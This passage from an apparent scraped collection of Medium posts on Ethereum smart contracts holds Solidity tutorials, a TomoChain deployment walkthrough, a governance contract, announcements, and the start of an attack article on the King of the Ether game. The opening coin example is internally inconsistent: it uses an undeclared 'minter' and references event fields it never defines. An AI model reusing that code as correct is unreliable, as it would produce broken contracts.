simple crypto example**/address public iMinter;uint public SumTotalCoin;event CoinsMintedLog(address addressedTo, uint amount);event CoinsSentLog(address sentTo, uint amount);mapping (address => uint) balances;function Coin(uint initCoins) {iMinter = msg.sender;SumTotalCoin = initCoins;balances[iMinter] = initCoins;}/// @notice Mint the coins/// @dev This does not return any value/// @param owner address of the coin owner, amount amount of coins to be delivered to owner/// @return Nothingfunction mint(address owner, uint amount) {if (msg.sender != iMinter) return;balances[owner] += amount;SumTotalCoin += amount;CoinsMintedLog(owner, amount);}function send(address receiver, uint amount) {if (balances[msg.sender] < amount) return;balances[msg.sender] -= amount;balances[receiver] += amount;CoinsSentLog(receiver, amount);}function queryBalance(address addr) constant returns (uint balance) {return balances[addr];}function killCoin() returns (bool status) {if (msg.sender != minter) throw;selfdestruct(minter);}}Explanation Time For MyFirstCoin:address public iMinter;declares a state variable of type address that is publicly accessible. The address type is a 160-bit value that does not allow any arithmetic operations. It has public access type so that you can access these data state variable current value it holds, Without this keyword, other contracts have no way to access the variable. The function will look something like this:function minter() returns (address) { return iMinter; }mapping (address => uint) public balances;here we are creating a balance type of complex state variable which maps addresses to unsigned integer data type. Here mapping an address uses hash tables which virtually initialized such that every possible key exists and is mapped to a value whose byte-representation is all zeros.event CoinsSentLog(address sentTo, uint amount);This event is triggered within the function send where it listens to the. As soon as it is fired, the listener will also receive the arguments from, to and amount, which makes tracking transactions. To listen for this event, you can use below code snippetMyFirstCoin.Sent().watch({}, \u2018\u2019, function(error, result) {if (!error) {console.log(\u201cCoin transfer: \u201c + result.args.amount +\u201c coins were sent from \u201c + result.args.from +\u201c to \u201c + result.args.to + \u201c.\u201d);console.log(\u201cBalances now:\\n\u201d +\u201cSender: \u201c + MyFirstCoin.balances.call(result.args.from) +\u201cReceiver: \u201c + MyFirstCoin.balances.call(result.args.to));}})MyFirstCoin is the constructor which is run during creation of the contract and cannot be called afterwards. It permanently stores the address of the person creating the contract: msg (together with tx and block) is a magic global variable that contains some properties which allow access to the blockchain. msg.sender is always the address where the current (external) function call came from.functions like mint and send, will eventually hold the contracts to enquired by the users & other similar contracts. If anyone other than contract creator tries to access mint it is not possible.Only send method can be used by a person who already have some coins in their kitty to send.4. Some Infographics: To Keep You Informed:source: chipin.comWhat Next\u00a0?I hope you now have some required understanding of how to write a basic smart contract\u00a0, next we will further try to understand how EVM ethereum virtual machine function and manages transactions. Some of the things which we will cover in the upcoming series of articles on \u201c Blockchain Using Solidity.\u201d -EVM OverviewEthereum AccountsTransactions Between Those Accounts& much more\u2026.Summing Up:As I have already spoken in one of my article Top 3 Technology Trends For 2018, Which Will Be A Game Changer\u00a0! that Blockchain based tech will be a hot cake in coming years and if one is looking for better career opportunity professionally he should not only keep a close eye on it, but also need to invest some serious time learning the craft of it. Banking, voting, insurance, user authentication, contracting & many more use cases will pop up as the year unfolds, and one should not just let it pass by. As a developer or as an entrepreneur it becomes really important that we adopt this trend and create some innovative solutions which can pass on the benefit to the masses.Already people who never traded in the existing share market have started to invest in their capacity on cryptos, with all excitement to grow their wealth. The ease of creating account & freedom to invest without too much regulation has fascinated many new & first time investor. This is not going to cool of any sooner.With all this open market opportunities, now onus is on all the Technology innovators & Visionaries to utilize this blockchain technology and see what they can come up with, to fire the imagination of the youth, who are going to be an early adopter of what we have to offer.Don\u2019t forget to check out my thoughts on edge computing:All About Edge Computing- How It Is Changing The Present Past & Future Of IoT?which i feel will be a tech trend to watch out in 2018 & beyond.If you are \ud83d\udc9a \ud83d\udc9a my contribution do \ud83d\udc4f \ud83d\udc4f clap\u00a0, Click Here and subscribe to reach out to me for more and I would feel blessed to hear you and respond\u00a0back.for more do check out\u00a0: www.techprenuer.com where very often i share my learning for all you lovely readers\u00a0.I am really honored with all the love & feedbacks, I have been receiving for my contribution and i am really thankful to all of you for inspiring me\u2026.Thanks A Lot & Wishing You All A Very Blissful New Year 2018,\u00a0ahead.", "responses": ""}, {"title": "Don\u2019t code another Smart Contract without understanding the 4 languages in 6 minutes\u00a0first", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/@merunasgrincalaitis/dont-code-another-smart-contract-without-understanding-the-4-languages-in-10-minutes-first-1c2dea165fcf?source=search_post", "post_date": "Sep 8, 2018", "readtime": "6 min read", "upvotes": "124", "content": "Don\u2019t code another Smart Contract without understanding the 4 languages in 6 minutes\u00a0firstMerunas GrincalaitisBlockedUnblockFollowFollowingSep 8, 2018Do you know that there are 4 main programming languages in Ethereum for creating Smart Contracts and decentralized applications? Wanna know which one is the best option for your project? Keep reading to find out.In this article I will provide you a concise overview of the most popular Ethereum programming languages available right now.By the end of it, you\u2019ll know exactly which option is the absolute best for your specific needs so that you don\u2019t waste time and resources on something too limited or hard to maintain.Be sure stick till the end for resources to learn more about each language.Here\u2019s the table of contents:VyperSoliditySerpentLLLThe best solution for youFinal verdict", "responses": "4"}, {"title": "How to compile, deploy and test a Smart Contract on TomoChain testnet", "author_name": "Sittiphol Phanvilai", "link": "https://medium.com/@nuuneoi/how-to-compile-deploy-and-test-a-smart-contract-on-tomochain-testnet-505eca8c9586?source=search_post", "post_date": "Jun 14, 2018", "readtime": "10 min read", "upvotes": "367", "content": "How to compile, deploy and test a Smart Contract on TomoChain testnetSittiphol PhanvilaiBlockedUnblockFollowFollowingJun 14, 2018This article consists of the example Solidity smart contract source codes and the full instructions to:Setup Truffle, the most popular development framework for Ethereum which also works perfectly for TomoChain.Create a TomoChain wallet.Obtain Wallet\u2019s Backup KeyRequest fund to the created TomoChain wallet.Explore the Block ExplorerCompile and deploy the created smart contract to TomoChain testnet.Connect Metamask to TomoChain testnet.Create a front end website and make it interact with TomoChain smart contract through web3.js.Required KnowledgesTo understand to whole things clearly, you need to have an knowledge on Solidity, Truffle and web3.js. Anyway, even if you don\u2019t, you still can follow the instructions step by step to complete the codelab.What is TomoChain?TomoChain is an Ethereum fork that performs significantly better. Its block time was reduced from 15s to just 2s and the transaction fee is closed to zero.And since it is an Ethereum fork, any development kit or programming language that works for Ethereum will also works for TomoChain!TomoChain is developed by Vietnam blockchain developer who is a former project lead of the famous NEM. Mainnet is expected to be live on Q4'18. Anyway, testnet is now already working and is also already opened to any developer to test their own dApp on it with no cost.Get Started: InstallationThere are two applications that we need to install through npm. The first one is Truffle, the development framework for Ethereum. We will use it to compile and deploy our smart contract to the testnet. And the second one is http-server, we will use it to create a simple http server to test our front-end website.$ npm install -g truffle http-serverAnd then let\u2019s clone tomochain-dapp-example repository to your local machine. All of the required codes are packed inside the repository.$ git clone git@github.com:nuuneoi/tomochain-dapp-example.gitInstall required npm package.$ cd tomochain-dapp-example$ npm installThat\u2019s all. Your compiler toolchain is now ready!Create a TomoChain WalletTo create a TomoChain wallet, just do the following easy steps:Browse to https://wallet.tomocoin.io/Click on + CREATE NEW WALLET button.You will now have a TomoWallet! Address will be shown on the top left area. Write it down somewhere. We will use it in many steps below.Easy, huh?Obtain Wallet\u2019s Backup\u00a0KeyBackup Key is a mnemonic seed representing the private spend key. It is pretty important, without it you will not be able to spend the balance in your address. Just don\u2019t forget to write it down somewhere or your wallet may be lost forever.Browse to https://wallet.tomocoin.io/Click on three dots menu at the right top position and click at SHOW YOUR BACKUP KEY. You will see the dialog popped up like this.Copy the words on the last row and write them down somewhere. (These words are also needed to be put in our source code in the smart contract deployment step below.)Please note that this mnemonic seed has to be kept private. Don\u2019t give it to anyone or post it to the public space otherwise your might lose the entire balance to the bad guy.You could now close the wallet tab since we will not use this site anymore. We just need it to generate an address and obtain the associated backup key.Request fundFund is needed to do stuff like smart contract deployment. Don\u2019t worry, it does not cost you any buck since it is the testnet! You can simply request some fund to be transferred to your wallet in few easy steps:Browse to https://faucet.tomochain.com/Put your wallet address to the textbox and make sure you pass the captcha test and then click on REQUEST 1 TOMO button.Wait for like 5\u201310 seconds and then\u00a0\u2026 tadaaaa. Your wallet should now have 1 TOMO transferred to. Let\u2019s go check it.Explore the Block\u00a0ExplorerTo check to latest balance of the address, let\u2019s do it in Tomoscan a.k.a. the TomoChain block explorer!Browse to https://explorer-testnet.tomochain.com/In the search box on the top right area, enter the address and then press the enter key.The TOMO Balance should be shown as 1 TOMO like this.Tips: Don\u2019t look at the TOMO USD Balance since it may be quite depressing right now.Now your wallet has an enough balance to do the entire things in this tutorial so\u00a0\u2026 let\u2019s go ahead!Compile and deploy the created smart contract to TomoChain testnetThe source code in this git repository is written in Truffle framework which is pretty handy. You can compile and do things in just one command line.Look at the source\u00a0codeThis is a Solidity source code used in this tutorial. You can find it in contracts/SimpleContract.sol file.pragma solidity ^0.4.18;contract SimpleContract {    event BalanceUpdated(uint balance);    uint balance;    constructor() public {        // Set initial balance as 1000        balance = 1000;    }    function setBalance(uint newBalance) public {        // Cap balance to be between 0 to 10000 (inclusive)        require(newBalance <= 10000);        // Set new balance        balance = newBalance;        // Emit an event        emit BalanceUpdated(balance);    }    function getBalance() public view returns(uint) {        return balance;    }}This smart contract is super basic. It allows you to set the public variable balance through setBalance function and you can retrieve the balance by calling getBalance. If you are already familiar with Solidity, you should understand the whole code in no time.CompilingTo compile the source code, just type this command in the repository directory.$ truffle compileThe following result should be shown.Compiling ./contracts/Migrations.sol...Compiling ./contracts/SimpleContract.sol...Writing artifacts to ./build/contractsNow your smart contract has already been compiled. The compiled code are stored in the build directory. You can go check it out if you want to.Setting up the Deployment WalletNow it is almost ready to deploy to the testnet. Anyway, we need to specify the TomoChain wallet to deploy the smart contract first. Of course, the wallet we are going to use is the one that we created in the previous step. Here is the steps toOpen truffle.js file. Here is the content inside.'use strict'var HDWalletProvider = require(\"truffle-hdwallet-provider\");var mnemonic = '<PUT YOUR WALLET BACKUP KEY HERE>';module.exports = {  networks: {    development: {      host: \"127.0.0.1\",      port: 7545,      gas: 4000000,      network_id: \"*\"    },    tomotestnet: {      provider: function() {        return new HDWalletProvider(mnemonic, 'https://testnet.tomochain.com');      },      gas: 1000000,      network_id: 89    }  }};2. Copy the backup key obtained in the previous step and paste it as a value of mnemonic variable.var mnemonic = '<PUT YOUR WALLET BACKUP KEY HERE>';Done. Please note that the tomotestnet network will be used to deploy the smart contract we created. However, if you are familiar with Ganache, you could use the development network to do the local test as well if you want to.DeployingNow it is time to deploy the smart contract to the TomoChain testnet! You can deploy the compiled smart contract using the following command.$ truffle migrate --network tomotestnetHere is the expected result.Using network \u2018tomotestnet\u2019.Running migration: 1_initial_migration.js  Deploying Migrations...  ... 0x081825424ce179259d661e2cd508b6a3ec5d3c622275168bff3f0d8460348c3f  Migrations: 0x65730da7e39d3787723a8949bc7d41e7f0f013baSaving successful migration to network...  ... 0xd96186343a751f2365d6311d6c7c52d67a86eee04854c40806a628526b0a573aSaving artifacts...Running migration: 2_deploy_contracts.js  Deploying SimpleContract...  ... 0xe80a4bac1ebbfcdd5170d469aa3998f1ee292227b3c7fa677e108135a7feb705  SimpleContract: 0xb9cb9aa779c0ae4d6fe8a2292fc61233c5cad4beSaving successful migration to network...  ... 0x1397e27ad32783349568f65397e81f54dd3b1c36aa9405f06a804b271a23a88cSaving artifacts...Don\u2019t be surprise if those hex code are not the same as mine since they would be different for each person.It is worth noting that the long hex code are the TxHash while the short one are contract address. If you want to play around, please feel free to copy those hex code in block explorer and see the details. Anyway, I will not go over those stuffs since it is too details.Alright, although there are a lot of alien stuff printed out right now but actually the only address that we need to use in the further step is 0xb9cb9aa779c0ae4d6fe8a2292fc61233c5cad4be which is the contract address of SimpleContract we created. Please note that your contract address will be different than mine so please ignore my address and use yours instead.Go Checking the Deployment TransactionThe deployment steps are actually simply a set of transactions so we can see them on block explorer. So\u00a0\u2026 let\u2019s go check them out! Just simply go to the Tomoscan page and enter your address. 4 new transactions would be shown like below.No action item on this. Just want you to make sure that your contract deployment has successfully been done on TomoChain testnet.You may already notice that how fast the deployment step above was. It used just around 20 seconds to finish or just 5 seconds for each transaction created to be confirmed. Super fast\u00a0!Connect Metamask to TomoChain testnet.Metamask will be used as a provider to create a transaction and interact with smart contract on the testnet. (As I already mentioned above, everything that works with Ethereum will also work with TomoChain).However, TomoChain is not natively supported on Metamask. We need to manually define the custom rpc server for TomoChain testnet. Here is the steps to do:Install Metamask for Chrome2. Click on the Metamask icon on address bar. Click on the top left menu and choose Custom RPC3. Type https://testnet.tomochain.com in the RPC textbox and then click Save4. Click on Restore from seed phrase and put the mnemonic from above step to the Wallet Seed text area. Also don\u2019t forget to set the password to protect the wallet from people who share the computer with you.5. You should now be good. The wallet supposes to be shown correctly in both address and balance.Please note that the unit of the wallet here is TOMO but since Metamask does not know TOMO so it just shows as ETH as you can see above.Congratulations! Metamask is now ready to interact with TomoChain testnet!Create a Front-End Website Interacting with the Smart\u00a0ContractSimple demo website used to interact with the deployed smart contract has also come along with tomochain-dapp-example repository. You can find it in web directory. The only file you need to work with is index.html. The web is almost ready to run but still need some modification. Please do the following steps.Find the abi json value from build/contracts/SimpleContract.json, copy it and replace the abi value in index.html with that json array, for example,.var abi = [    {      \"inputs\": [],      \"payable\": false,      \"stateMutability\": \"nonpayable\",      \"type\": \"constructor\"    },    {      \"anonymous\": false,      \"inputs\": [        {          \"indexed\": false,          \"name\": \"balance\",          \"type\": \"uint256\"        }      ],      \"name\": \"BalanceUpdated\",      \"type\": \"event\"    },    {      \"constant\": false,      \"inputs\": [        {          \"name\": \"newBalance\",          \"type\": \"uint256\"        }      ],      \"name\": \"setBalance\",      \"outputs\": [],      \"payable\": false,      \"stateMutability\": \"nonpayable\",      \"type\": \"function\"    },    {      \"constant\": true,      \"inputs\": [],      \"name\": \"getBalance\",      \"outputs\": [        {          \"name\": \"\",          \"type\": \"uint256\"        }      ],      \"payable\": false,      \"stateMutability\": \"view\",      \"type\": \"function\"    }  ];2. Replace the contract address with your own SimpleContract contract address, for example,var contractAddress = '0xb9cb9aa779c0ae4d6fe8a2292fc61233c5cad4be';3. Source code is now ready. Now it is time to spin up the http server by going to Terminal and type the following command.$ cd web$ http-server .The server is now launched on port 8080. You can now browse to the web created through browser at http://localhost:8080 and give a test!TestOnce opened, front-end web will immediately call getBalance() function and show the result in the above area.You can input the new balance you need and click at Set New Balance button to set the new value.And since this operation requires Metamask to create and sign a transaction for you, Metamask will be automatically launched with the predefined parameter calling to setBalance() function on the deployed smart contract. Please feel free to review those Tx parameter and then just simply click on SUBMIT button.The transaction progress will be updated in the below area. You can also view the transaction information from the TxHash row if you want to.It is worth noting that the transaction is consistency confirmed in just 4\u20135 seconds after your Tx has been created which is super fast!! (2 seconds of block time and 2-3 seconds of network latency.)Congratulations! Your first smart contract is now deployed on TomoChain testnet and you can also interact with it through simple web3.js provider on web front-end!Sorry for not going over the front-end source code because I am afraid that it would be too much. However, the source code is not so complicated, please feel free to review it yourself!AuthorTutorial created by Sittiphol Phanvilai (nuuneoi)", "responses": ""}, {"title": "Authorizable\u200a\u2014\u200aEthereum Smart Contracts Governance Made\u00a0Easy", "author_name": "Francesco Sullo", "link": "https://medium.com/0xnil/authorizable-ethereum-smart-contracts-governance-made-easy-541d3eab5ff9?source=search_post", "post_date": "Apr 4, 2018", "readtime": "3 min read", "upvotes": "147", "content": "Authorizable\u200a\u2014\u200aEthereum Smart Contracts Governance Made\u00a0EasyFrancesco SulloBlockedUnblockFollowFollowingApr 4, 2018We are in the early stage of smart contract development, and things that are normal in centralized software development are just going to happen in the decentralized world. Governance is one of those things.An example: CryptoKittiesThe CryptoKitties smart contract is at https://etherscan.io/address/0x06012c8cf97bead5deae237070f9587f8e7a266d#code. If you take a look at the code, you will see how they solved the governance extending where needed the contract KittyAccessControl:contract KittyAccessControl {...    address public ceoAddress;    address public cfoAddress;    address public cooAddress;    modifier onlyCEO() {        require(msg.sender == ceoAddress);        _;    }    modifier onlyCFO() {        require(msg.sender == cfoAddress);        _;    }    modifier onlyCOO() {        require(msg.sender == cooAddress);        _;    }    modifier onlyCLevel() {        require(            msg.sender == cooAddress ||            msg.sender == ceoAddress ||            msg.sender == cfoAddress        );        _;    }    function setCEO(address _newCEO) external onlyCEO {        require(_newCEO != address(0));        ceoAddress = _newCEO;    }    function setCFO(address _newCFO) external onlyCEO {        require(_newCFO != address(0));        cfoAddress = _newCFO;    }    function setCOO(address _newCOO) external onlyCEO {        require(_newCOO != address(0));        cooAddress = _newCOO;    }...}This approach works in this context because the contract cannot be modified. A better approach to smart contract development is to allow the contract to evolve, as summarized by Jack Tanner in this post:Summary of Ethereum Upgradeable Smart Contract StrategiesThis article is a summary of research and development in the area of upgradeable Ethereum smart contracts.blog.indorse.ioDoing so, you need some general approach to governance that allows flexibility while keeping the contract safe. An advanced solution is AragonOS:Introducing AragonOS: Say hi to modular and extendable organizationsAragon\u2019s new exokernel-inspired architectureblog.aragon.oneIn the post above, Jorge Izquierdo writes about upgradeability:Smart contract upgradeability is a topic we spend a lot of time thinking about at Aragon. We need to ensure that the organizations that run Aragon will be securely available for years to come.When I first thought about Authorizable, I made the same reflection. My solution is not as sophisticated as AragonOS, but it is simpler and effortless to implement.The Authorizable smart\u00a0contractFirst off, you can look at the code at https://github.com/tweedentity/authorizable/blob/master/contracts/Authorizable.solAny wallet able to perform something in a smart contract has an assigned level. The level is a uint256, which means that you can manage a huge amount of levels and combine them to do everything you want.To simplify your life, though, you\u2019d probably prefer to set a limited number of levels. For this reason, there are two special variables with a reasonable default value:uint public maxLevel = 64;  uint public authorizerLevel = 56;The second is the minimum level required to authorize other wallets. The only restriction is that as soon as you authorize a wallet, to keep the contract consistent, you won\u2019t be able to change these two variables.When you have set some roles, you\u2019ve a bunch of self-explaining useful modifiers:onlyOwner        // inherited by ZeppelinOS\u2019s OwnableonlyAuthorizedonlyAuthorizedAtLevel(uint _level)onlyAuthorizedAtLevels(uint[] _levels)onlyAuthorizedAtLevelsWithin(uint _minLevel, uint _maxLevel)onlyOwnerOrAuthorizedonlyOwnerOrAuthorizedAtLevel(uint _level)onlyOwnerOrAuthorizedAtLevels(uint[] _levels)onlyOwnerOrAuthorizedAtLevelsWithin(uint _minLevel, uint _maxLevel)onlyAuthorizerIt could have set a generic modifier with many options, but I thought that it was better to explicitly cover all the primary cases without adding exoteric modifiers. You can always add some in your contract.The CryptoKitties caseFirst off, they didn\u2019t need KittyAccessControl because Authorizable covers all their needs.In KittyAccessControl they considered three roles that in our case could be:CEOLevel: 60 // able to authorize other wallets because >= 56CTOLevel: 50CFOLevel: 40To authorize the ceoAddress the owner could call:authorize(ceoAddress, 60);After, ceoAddress could do the same to authorize cfoAddress and ctoAddress. Then, in the contract, the following functionfunction withdrawBalance() external onlyCFO {    ...}would befunction withdrawBalance() external onlyAuthorizedAtLevel(40) {    ...}The advantage is clear. CryptoKitties is growing. In the future, there could be an entire department working on financials. In this case, it is very likely that there will be more than one address authorized to do that job. Using Authorizable that\u2019s easy; using the actual CryptoKitties contract that\u2019s impossible.Finally, the onlyClevel modifier would be substituted like:uint[] Clevels = [40, 50, 60];function setSecondsPerBlock(uint256 secs) external   onlyAuthorizedAtLevels(Clevels) {      ...};", "responses": ""}, {"title": "DIW and Smarter Contract partnership brings human judgement to smart contracts", "author_name": "DIW Token", "link": "https://medium.com/@diwtoken/diw-and-smarter-contract-partnership-brings-human-judgment-to-smart-contracts-958170dc1115?source=search_post", "post_date": "Mar 18, 2018", "readtime": "2 min read", "upvotes": "266", "content": "DIW and Smarter Contract partnership brings human judgement to smart contractsDIW TokenBlockedUnblockFollowFollowingMar 18, 2018To secure the best possible escrow service, DIW has just announced that it is partnering with Smarter Contract, a contract resolution platform, to broaden the applications of smart contracts by incorporating human judgement. One of the functionalities of DIW\u2019s network is its escrow service, which is available to all its members who choose to opt-in. However, the blockchain-based digital secure global platform will offer it by default to members for transactions of $5,000 USD or more.Human judgement is required to determine how funds are released from escrow for certain transactions. DIW and Smarter Contract\u2019s collaboration incorporates such human judgement into smart contracts, thus enabling any escrow transaction to be executed with peace of mind through DIW\u2019s paid escrow platform.DIW\u2019s paid escrow service for smart contracts is an additional feature of its blockchain-based, decentralized network, complete with its own ecosystem and currency. Smarter Contract\u2019s service will ensure that where necessary, experts resolve any dispute arising out of these smart contracts through a system that is autonomous, low cost, and reliable.Together, DIW and Smarter Contract will enable any escrow transaction to be executed with peace of mind through DIW\u2019s paid escrow platform.About DIW:DIW is a blockchain-based digital secure global platform where organizations and individuals will be able to exchange services, funds and sensitive private data in a fully secure manner. The platform\u2019s gateway is a highly secure vault that each member possesses and uses to store their private, sensitive digital data. The project also plans to release an easily integrated check out system for existing e-commerce websites accepting cryptocurrency. Ultimately, DIW plans to incorporate the medical world by handling critical electronic health records. Learn more at diwtoken.com.About Smarter Contract:Headed by blockchain veteran Vladimir Dubovskiy and contract expert Ashish Bhatt, Smarter Contract enables any transaction to be executed through smart contracts, regardless of its complexity. The company\u2019s platform resolves both smart and traditional contract disputes by applying expert judgement delivered through its autonomous network. Smarter Contract\u2019s patent-pending technology maximizes the accuracy and minimizes the cost of that judgement. It can reduce the cost of dispute resolution to less than 10% of prevailing costs in the traditional judicial system.", "responses": "1"}, {"title": "What is a smart-contract?", "author_name": "EVO", "link": "https://medium.com/@evo.live/what-is-a-smart-contract-dfa59127f534?source=search_post", "post_date": "Mar 16, 2018", "readtime": "", "upvotes": "92", "content": "What is a smart-contract?EVOBlockedUnblockFollowFollowingMar 16, 2018A smart\u200a\u2014\u200acontract is a computer algorithm designed to conclude and maintain self-executing contracts in a blockchain environment. These contracts are written in the form of code that exists in a distributed registry\u200a\u2014\u200aa blockchain that is maintained and managed by a network of computers to exchange assets without resorting to intermediaries\u00a0.Also smart\u200a\u2014\u200acontracts allow you to perform reliable and confidential transactions without the involvement of external intermediaries in front of banks or banks and government agencies. In addition, such transactions are traceable, transparent and irreversible.Smart contracts not only contain information about the obligations of the parties and sanctions for their violation, but also automatically ensure the fulfillment of all the terms of the contract.#EVOLIVE #EVOPRO #Smart_contract #Vocabulary #ICO #Blockchain #Cryptocurrency", "responses": ""}, {"title": "", "author_name": "", "link": "https://blog.surbtc.com/qu%C3%A9-es-un-smart-contract-8339ad319dff?source=search_post", "post_date": "", "readtime": "", "upvotes": "", "content": "", "responses": ""}, {"title": "Executing and Accessing Smart Contract Without\u00a0Truffle", "author_name": "Niharika Singh", "link": "https://medium.com/coinmonks/executing-and-accessing-smart-contract-without-truffle-415f1e647d66?source=search_post", "post_date": "Jan 4", "readtime": "5 min read", "upvotes": "526", "content": "Executing and Accessing Smart Contract Without\u00a0TruffleNiharika SinghBlockedUnblockFollowFollowingJan 4I know that Truffle has become a standard to work around with smart contracts but practicing everything fundamentally and transparently is what makes everything more lucid.In this tutorial, we will write a simple smart contract in Solidity and make calls to it directly via Web3. Of course, this is going to be longer than the Truffle method but, it is going to be worthwhile.I hope you like it.So let\u2019s get\u00a0started.Setting up the environmentAny text editor (Vim maybe haha)NodeJS (latest version)\u200a\u2014\u200ahttps://nodejs.org/en/Ganache to simulate blockchain in one click!\u200a\u2014\u200ahttps://truffleframework.com/ganacheWill to learn", "responses": "1"}, {"title": "The joy of minimalism in smart contract\u00a0design", "author_name": "Rob Hitchens", "link": "https://blog.b9lab.com/the-joy-of-minimalism-in-smart-contract-design-2303010c8b09?source=search_post", "post_date": "Apr 17, 2018", "readtime": "3 min read", "upvotes": "164", "content": "Image credit: \u00c9mile\u00a0PerronThe joy of minimalism in smart contract\u00a0designRob HitchensBlockedUnblockFollowFollowingApr 17, 2018Blockchains and smart contracts are extraordinary solutions best reserved for a specific set of problems.We all know blockchains and smart contracts provide unmatched assurances about unstoppable logic and immutable data. As attractive as that sounds, it\u2019s best to use them as sparingly as possible. A well-crafted, minimalist contract only addresses concerns that cannot be addressed any other way.\u201cIf a concern can possibly be addressed outside of a smart contract, then that\u2019s what we should\u00a0do.\u201dThat may seem counterintuitive coming from someone who specializes in helping others maximize the utility of smart contracts and blockchains. But it\u2019s not a contradiction. Blockchains and smart contracts are extraordinary solutions. It\u2019s best to reserve them for extraordinary problems. Use them to create trust and resolve uncertainty\u200a\u2014\u200anothing routine.For example, if you merely want to award points, countless examples existed long before blockchain. On the other hand, if you want to prove that those points are always and will always be awarded by a disclosed formula, then you may need to make the formula an observable fact on the blockchain. That would be solving for trust in the meaning of the scores.This interpretation implies a narrow scope of concerns a smart contract should address.Smart contracts:define the essential, enduring facts about the application,provide the authoritative record of the facts that all participants can refer to in order to know they have the correct information, andprovide evidence of application integrity via immutable processes that prevent corruption in any form.With those concerns attended to, it\u2019s usually a good idea to make the complete state conveniently discoverable and completely auditable. Beyond these core concerns are details that can be attended to by software clients.Consider the idea of sorting the data in the contract or finding a way to search it and filter it efficiently. It might be very useful, perhaps even critical to the overall solution. Even so, high importance doesn\u2019t imply that the implementation belongs at the smart contract level.Given that:the data in the contract is completely discoverable,state changes emit events in real time (as they should), andclients can inspect the state, listen to events, or both,software clients can employ a range of strategies to discover the facts they need in any given moment. Minimalist contract design provides the toolbox for constructing an appropriate client-side implementation without attempting to do the software client\u2019s job. Indeed, the author would argue that client-side convenience shouldn\u2019t influence contract design.Whether it\u2019s a browser app or a massive cluster of caching servers, the contract\u2019s posture toward the outside world is the\u00a0same:The state is completely discoverable.State changes are (should be) broadcast by event emitters.Any off-chain caching strategy is acceptable but the contract\u2019s version of the facts is always authoritative.Any off-chain query solution is acceptable.Any service that purports to perform these services can (and should) provide clients with all the necessary details clients would need to check the blockchain for themselves, if they want to.Knowing that a wide range of valid concerns will be attended to by off-chain processes greatly reduces the scope of functions that need to be coded inside a contract. A minimalist contract addresses only concerns that can\u2019t be addressed any other way.Minimalism leads to clarity about exactly what the contract needs to prove and the minimum logic and data required to construct the proof. Minimalism is the first defense against defects that might have non-trivial consequences. The ideal is something so simple that there are obviously no defects.\u201cObviously no defects\u201d is easier said than done, which is why an Audit and a Bug Bounty is an absolute must before any piece of software should be entrusted with significant value.When you\u2019re aiming for perfection, simple is better.", "responses": "2"}, {"title": "Wallet Update: Easily Interact with Any Smart\u00a0Contract", "author_name": "GoChainGo", "link": "https://medium.com/gochain/wallet-update-easily-interact-with-any-smart-contract-fd9a01b931f1?source=search_post", "post_date": "Oct 8, 2018", "readtime": "2 min read", "upvotes": "682", "content": "Wallet Update: Easily Interact with Any Smart\u00a0ContractGoChainGoBlockedUnblockFollowFollowingOct 8, 2018A new update has been released for the GoChain wallet that enables you to interact with any smart contract. Previously, you could deploy a contract, but now you can deploy it and use it! What novel idea huh?It\u2019s really easy to use, after opening your wallet, click the Use Contract section, enter the contract address and the ABI:Contract address and\u00a0ABIOnce you\u2019ve done that, a list of contract functions will appear and you can choose whichever one you want to use:Contract functionsRead only functions will display the result immediately:Writable functions will give you input form fields to fill in, then click Send to start the transaction:It\u2019s that simple. Give it a try yourself, try deploying a contract (it\u2019s easy!) and then use it right away.If you have any issues or feature requests, please create an issue here.", "responses": ""}, {"title": "Ethereum Foundation Funds Ivy League Research on Smart Contracts", "author_name": "Dima Zaitsev", "link": "https://medium.com/@forinnovDot/ethereum-foundation-funds-ivy-league-research-on-smart-contracts-36df7f36f85b?source=search_post", "post_date": "Mar 17", "readtime": "", "upvotes": "221", "content": "Ethereum Foundation Funds Ivy League Research on Smart ContractsDima ZaitsevBlockedUnblockFollowFollowingMar 17Dima Zaitsev shares his thoughts on smart contract developmentThe Ethereum Foundation awarded a grant to researchers at Columbia and Yale to compile a new smart contract programming language into the Ethereum Virtual Machine. The research will focus on supporting Ethereum 2.0 and scaling the network. Other work will be done to shore up security around smart contracts and fix vulnerabilities.The programming language in development is called DeepSEA, and was originally created by the computer science department chair at Yale.Professor Gu, the project lead from Columbia, highlighted the importance of impeccable performance, \u201cbecause [smart] contracts are self-executable and permanent, it is crucial that these contracts perform only as they are precisely intended. The DeepSEA language will allow programmers to add safeguards to ensure that the code conforms exactly to its specifications, using Formal Verification.\u201dFormal verification uses mathematical proofs to verify that code is correctly implemented.Dima Zaitsev is excited for further developments, \u201csmart contracts are going to be the backbone of all future digital interactions, but right now, glitches and improper implementation are holding them back. The sooner we iron out these problems, the better.\u201d", "responses": ""}, {"title": "Smart Contract Attacks [Part 2] - Ponzi Games Gone\u00a0Wrong", "author_name": "Pete Humiston", "link": "https://hackernoon.com/smart-contract-attacks-part-2-ponzi-games-gone-wrong-d5a8b1a98dd8?source=search_post", "post_date": "Jul 23, 2018", "readtime": "12 min read", "upvotes": "123", "content": "Smart Contract Attacks [Part 2] - Ponzi Games Gone\u00a0WrongPete HumistonBlockedUnblockFollowFollowingJul 23, 2018Ponzi Games. If you followed the Ethereum blockchain in 2016 you\u2019d know that early day smart contract development had a plethora of Ponzi Games. Like a traditional Ponzi Scheme, these games were designed such that their continuation was contingent on the marginal player joining the contract to keep the \u201cfun\u201d going. While these contracts were destined to come to an abrupt end, some would find that the end would come for a different reason\u2026In Part 2 of Smart Contract Attacks (Part 1 Here) I\u2018ll be walking you through three Ponzi Games that fell victim to smart contract vulnerabilities and how to avoid making the same mistakes. You\u2019ll also develop a greater overall comprehension of smart contract development, contract best practices, and a brief overview of Ethereum\u2019s most notable Ponzi Games.Attack #1: Exception DisorderAn exception disorder attack occurs when an attacker takes advantage of a contract\u2018s failure to return an exception error. An exception error is triggered when a contract unsuccessfully calls a functions like address.send() or address.call.value(). The error itself will not be flagged unless the contract is instructed to do so; exception errors are not autogenerated.The AttackOn February 6th, 2016 King of the Ether Throne (KotET) smart contract was deployed. KotET was game whereby players would send the contract a set amount of ether to take \u201cthe throne\u201d. Upon taking the throne, the player was added to the \u201cHall of Monarchs\u201d and forever immortalized on the blockchain. More importantly, the new king became entitled to the ether paid by the subsequent king who would usurped them. As the number of Kings who took the throne grew, the cost to become King grew incrementally more expensive. If 14 days passed without a new successor, the throne was reset and the game started all over again. The idea is that a new King pays up to claim the throne with the intent of a successor coming along and paying a higher price\u200a\u2014\u200a\u201cGreater Fool\u2019s 